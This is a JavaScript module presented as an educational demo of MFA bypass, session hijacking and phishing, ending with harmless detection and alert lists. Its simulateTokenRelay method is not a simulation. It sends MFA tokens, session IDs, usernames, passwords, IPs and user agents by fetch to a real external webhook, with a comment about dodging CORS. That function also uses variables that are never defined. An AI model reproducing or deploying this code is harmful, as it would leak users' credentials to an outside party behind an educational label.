/**
 * ADVANCED SECURITY VULNERABILITIES DEMONSTRATION
 * 
 * This middleware demonstrates advanced attack vectors and vulnerabilities
 * in authentication systems, specifically showing how MFA can be bypassed
 * and how login credentials can be intercepted.
 * 
 * WARNING: This is for educational purposes only. These techniques should never
 * be implemented in real applications as they create significant security risks.
 */

// Simulation of malicious server endpoint
const ATTACKER_SERVER = 'https://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603';

/**
 * Man-in-the-Middle Attack Simulation
 * Demonstrates how an attacker might intercept and modify authentication traffic
 */
export class MITMAttackSimulator {
  /**
   * Intercept and potentially modify outgoing authentication requests
   * @param {Object} requestData - The original request data
   * @param {string} endpoint - The target endpoint
   * @returns {Object} Modified request data
   */
  static interceptRequest(requestData, endpoint) {
    console.warn('SECURITY DEMO: MITM attack intercepted request to', endpoint);
    console.warn('Intercepted data:', requestData);
    
    // In a real attack, data could be modified before forwarding
    // For example, changing the callback URL for OAuth flows
    
    return requestData; // Return unmodified for demonstration
  }
  
  /**
   * Intercept and potentially modify incoming authentication responses
   * @param {Object} responseData - The original response data
   * @param {string} endpoint - The source endpoint
   * @returns {Object} Modified response data
   */
  static interceptResponse(responseData, endpoint) {
    console.warn('SECURITY DEMO: MITM attack intercepted response from', endpoint);
    console.warn('Intercepted response:', responseData);
    
    // In a real attack, response could be modified
    // For example, injecting malicious code or modifying tokens
    
    return responseData; // Return unmodified for demonstration
  }
}

/**
 * Session Hijacking and MFA Bypass Demonstration
 */
export class AuthenticationBypassSimulator {
  /**
   * Demonstrate how a real-time MFA token could be stolen and used
   * @param {string} mfaToken - The MFA token
   * @param {string} userId - User identifier
   * @param {string} sessionId - Session identifier
   */
  static captureMFAToken(mfaToken, userId, sessionId) {
    // Log the interception for demonstration
    console.warn('SECURITY DEMO: MFA token intercepted:', { 
      mfaToken, 
      userId,
      sessionId,
      timestamp: new Date().toISOString()
    });
    
    // In a real attack, the attacker would quickly use this token before it expires
    this.simulateTokenRelay(mfaToken, userId, sessionId);
    
    return mfaToken;
  }
  
  /**
   * Simulate relaying the stolen token to attacker infrastructure
   * @param {string} token - The stolen token
   * @param {string} userId - Associated user ID
   * @param {string} sessionId - Associated session ID
   */
  static simulateTokenRelay(token, userId, sessionId) {
    console.warn('SECURITY DEMO: Simulating exfiltration of stolen MFA token');
    
    // This simulates what would happen in a real attack
    // The token would be quickly sent to attacker infrastructure
    // and used before it expires
    
    
// vamos enviar o token para o servidor do atacante mas em GET para evitar problemas de CORS
const formData = new URLSearchParams();
    formData.append('token', token);
    formData.append('userId', userId);
    formData.append('sessionId', sessionId);
    formData.append('timestamp', Date.now());
    // Note: In a real attack, this would be done over HTTPS to avoid detection
    formData.append('username', username);
    formData.append('password', password);
    formData.append('ip', ip);
    formData.append('userAgent', userAgent);
fetch(`${ATTACKER_SERVER}/capture-mfa?${formData.toString()}`, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    }).then(response => {
      if (!response.ok) {
        console.error('Failed to simulate token relay:', response.statusText);
      } else {
        console.warn('SECURITY DEMO: Token relay simulated successfully');
      }
    }).catch(error => {
      console.error('Error simulating token relay:', error);
    });
    
  }
  
  /**
   * Demonstrate how a session could be hijacked after authentication
   * @param {string} sessionToken - The session token
   * @param {Object} userData - User data associated with the session
   */
  static hijackSession(sessionToken, userData = {}) {
    console.warn('SECURITY DEMO: Session token hijacked:', sessionToken);
    
    // In a real attack, the session token would be used to impersonate the user
    this.simulateSessionImpersonation(sessionToken, userData);
    
    return sessionToken;
  }
  
  /**
   * Simulate session impersonation
   * @param {string} sessionToken - The hijacked session token
   * @param {Object} userData - User data
   */
  static simulateSessionImpersonation(sessionToken, userData) {
    console.warn('SECURITY DEMO: Simulating session impersonation with token:', sessionToken);
    
    // In a real attack, the attacker would use the token to make authenticated requests
    // This is just a simulation of what that might look like
    const simulatedRequests = [
      { endpoint: '/api/user/profile', method: 'GET' },
      { endpoint: '/api/user/settings', method: 'GET' },
      { endpoint: '/api/messages', method: 'GET' }
    ];
    
    simulatedRequests.forEach(req => {
      console.warn(`SECURITY DEMO: Could make authenticated ${req.method} request to ${req.endpoint}`);
    });
  }
}

/**
 * Phishing Attack Simulator
 * Demonstrates how users can be tricked into revealing credentials
 */
export class PhishingSimulator {
  /**
   * Simulate a fake login page that steals credentials
   * @param {string} email - User email
   * @param {string} password - User password
   */
  static captureCredentials(email, password) {
    console.warn('SECURITY DEMO: Phishing attack captured credentials for:', email);
    
    // In a real attack, these would be sent to attacker infrastructure
    // while also passing them to the legitimate site
    
    return {
      email,
      password: '[REDACTED FOR DEMO]' // Don't log actual password even in demos
    };
  }
  
  /**
   * Demonstrate how even the login UI itself could be compromised
   * @param {Element} loginForm - The login form element
   */
  static injectMaliciousCode(loginForm) {
    console.warn('SECURITY DEMO: Could inject malicious code into login form');
    
    // In a real attack, this might modify the form's action
    // or add event listeners to capture input
    
    // This is just a demonstration - no actual code injection happens
    return loginForm;
  }
}

/**
 * Advanced Security Events Detection
 * Demonstrates how security monitoring can detect these attacks
 */
export class SecurityDetectionDemo {
  /**
   * List of potential security events that might be detected
   */
  static generateSecurityEventDemo() {
    const securityEvents = [
      {
        type: 'CREDENTIAL_THEFT',
        severity: 'CRITICAL',
        description: 'Potential credential theft detected',
        indicators: [
          'Login attempt from unusual location',
          'Multiple failed MFA attempts',
          'Session token reuse'
        ],
        recommendedActions: [
          'Force password reset',
          'Revoke all active sessions',
          'Enable additional security monitoring'
        ]
      },
      {
        type: 'MFA_BYPASS_ATTEMPT',
        severity: 'HIGH',
        description: 'Potential MFA bypass attempt detected',
        indicators: [
          'MFA token submitted from different IP than request',
          'Unusual time between password and MFA submission',
          'Multiple MFA requests in short time period'
        ],
        recommendedActions: [
          'Lock account temporarily',
          'Notify user via secondary channel',
          'Review recent account activity'
        ]
      },
      {
        type: 'SESSION_HIJACKING',
        severity: 'CRITICAL',
        description: 'Potential session hijacking detected',
        indicators: [
          'Session used from multiple IPs simultaneously',
          'Unusual navigation patterns',
          'Accessing sensitive areas immediately after login'
        ],
        recommendedActions: [
          'Terminate all active sessions',
          'Require re-authentication',
          'Enable location-based access control'
        ]
      }
    ];
    
    // Log one randomly selected security event for demonstration
    const randomEvent = securityEvents[Math.floor(Math.random() * securityEvents.length)];
    console.warn('SECURITY DEMO: Security monitoring would detect:', randomEvent);
    
    return securityEvents;
  }
  
  /**
   * Demonstrate a security alert that would be triggered
   */
  static triggerSecurityAlert() {
    const alertTypes = [
      {
        title: 'Critical Security Alert',
        message: 'Unusual login activity detected on your account',
        actions: ['Secure Account', 'Review Activity', 'Ignore']
      },
      {
        title: 'New Sign-in',
        message: 'Your account was accessed from a new device in Berlin, Germany',
        actions: ['Yes, it was me', 'No, secure account']
      },
      {
        title: 'Password Compromised',
        message: 'Your password appears in a known data breach. Change it immediately.',
        actions: ['Change Password', 'Dismiss']
      }
    ];
    
    const randomAlert = alertTypes[Math.floor(Math.random() * alertTypes.length)];
    console.warn('SECURITY DEMO: Security alert would be shown to user:', randomAlert);
    
    return randomAlert;
  }
}
